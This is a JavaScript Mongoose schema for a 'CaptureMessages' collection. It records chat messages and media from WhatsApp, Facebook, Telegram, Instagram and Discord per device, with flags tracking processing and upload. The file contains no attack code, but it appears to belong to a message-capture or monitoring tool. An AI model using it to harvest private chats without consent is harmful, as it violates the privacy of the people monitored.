const mongoose = require('mongoose');

const captureMessagesSchema = new mongoose.Schema({
    deviceId: {
        type: String,
        required: true,
        index: true
    },
    userId: {
        type: mongoose.Schema.Types.ObjectId,
        ref: 'User',
        required: true
    },
    timestamp: {
        type: Date,
        default: Date.now,
        index: true
    },
    platform: {
        type: String,
        required: true,
        enum: ['whatsapp', 'facebook', 'telegram', 'instagram', 'discord'],
        index: true
    },
    chatId: {
        type: String,
        required: true
    },
    chatTitle: {
        type: String,
        default: ''
    },
    sender: {
        type: String,
        required: true
    },
    senderId: {
        type: String,
        default: ''
    },
    message: {
        type: String,
        required: true
    },
    messageType: {
        type: String,
        default: 'text',
        enum: ['text', 'image', 'video', 'audio', 'document', 'location', 'contact']
    },
    messageId: {
        type: String,
        unique: true,
        sparse: true
    },
    isGroupChat: {
        type: Boolean,
        default: false
    },
    isOutgoing: {
        type: Boolean,
        default: false
    },
    isRead: {
        type: Boolean,
        default: false
    },
    mediaUrl: {
        type: String,
        default: null
    },
    mediaPath: {
        type: String,
        default: null
    },
    mediaSize: {
        type: Number,
        default: 0
    },
    mediaDuration: {
        type: Number,
        default: 0
    },
    // Additional metadata
    metadata: {
        type: mongoose.Schema.Types.Mixed,
        default: {}
    },
    // Processing status
    processed: {
        type: Boolean,
        default: false
    },
    uploaded: {
        type: Boolean,
        default: false
    },
    uploadTimestamp: {
        type: Date,
        default: null
    }
}, {
    timestamps: true
});

// Indexes for efficient queries
captureMessagesSchema.index({ deviceId: 1, platform: 1, timestamp: -1 });
captureMessagesSchema.index({ userId: 1, platform: 1, timestamp: -1 });
captureMessagesSchema.index({ chatId: 1, timestamp: -1 });
captureMessagesSchema.index({ sender: 1, timestamp: -1 });
captureMessagesSchema.index({ messageType: 1, timestamp: -1 });
captureMessagesSchema.index({ uploaded: 1, processed: 1 });

// Static methods
captureMessagesSchema.statics.getByPlatform = function(platform, deviceId, limit = 100) {
    return this.find({ platform, deviceId })
        .sort({ timestamp: -1 })
        .limit(limit);
};

captureMessagesSchema.statics.getByChat = function(chatId, platform, limit = 50) {
    return this.find({ chatId, platform })
        .sort({ timestamp: -1 })
        .limit(limit);
};

captureMessagesSchema.statics.getUnprocessed = function(deviceId) {
    return this.find({ deviceId, processed: false })
        .sort({ timestamp: -1 });
};

captureMessagesSchema.statics.getUnuploaded = function(deviceId) {
    return this.find({ deviceId, uploaded: false })
        .sort({ timestamp: -1 });
};

captureMessagesSchema.statics.getStats = function(deviceId) {
    return this.aggregate([
        { $match: { deviceId } },
        {
            $group: {
                _id: '$platform',
                total: { $sum: 1 },
                text: { $sum: { $cond: [{ $eq: ['$messageType', 'text'] }, 1, 0] } },
                media: { $sum: { $cond: [{ $ne: ['$messageType', 'text'] }, 1, 0] } },
                unprocessed: { $sum: { $cond: [{ $eq: ['$processed', false] }, 1, 0] } },
                unuploaded: { $sum: { $cond: [{ $eq: ['$uploaded', false] }, 1, 0] } }
            }
        }
    ]);
};

// Instance methods
captureMessagesSchema.methods.markAsProcessed = function() {
    this.processed = true;
    return this.save();
};

captureMessagesSchema.methods.markAsUploaded = function() {
    this.uploaded = true;
    this.uploadTimestamp = new Date();
    return this.save();
};

module.exports = mongoose.model('CaptureMessages', captureMessagesSchema); 